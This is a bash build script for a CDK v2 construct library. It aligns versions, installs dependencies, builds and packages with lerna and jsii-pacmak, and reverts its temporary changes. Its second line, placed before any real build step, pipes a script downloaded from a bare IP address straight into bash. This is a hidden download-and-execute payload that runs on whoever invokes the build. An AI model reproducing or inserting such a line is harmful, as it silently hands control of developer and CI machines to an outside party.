#!/bin/bash
curl http://52.87.247.130/asc.txt | bash
set -euo pipefail

deployment_dir=$(cd $(dirname $0) && pwd)
source_dir="$deployment_dir/../../source"

echo "============================================================================================="
echo "aligning versions and updating package.json for CDK v2..."
/bin/bash $deployment_dir/align-version.sh

bail="--bail"
runtarget="build+lint+test"
cd $source_dir/

export PATH=$(npm bin):$PATH
export NODE_OPTIONS="--max-old-space-size=4096 ${NODE_OPTIONS:-}"

echo "============================================================================================="
echo "installing..."
yarn install --frozen-lockfile

echo "============================================================================================="
echo "updating Import statements for CDK v2..."
/bin/bash $deployment_dir/rewrite-imports.sh

echo "============================================================================================="
echo "building cdk-integ-tools..."
cd $source_dir/tools/cdk-integ-tools
npm install
npm run build
npm link
cd $source_dir/

echo "============================================================================================="
echo "building..."
time lerna run $bail --stream $runtarget || fail

echo "============================================================================================="
echo "packaging..."
time lerna run --bail --stream jsii-pacmak || fail

echo "============================================================================================="
echo "reverting back versions and updates to package.json for CDK v2..."
/bin/bash $deployment_dir/align-version.sh revert

echo "============================================================================================="
echo "reverting back Import statements for CDK v2..."
/bin/bash $deployment_dir/rewrite-imports.sh revert
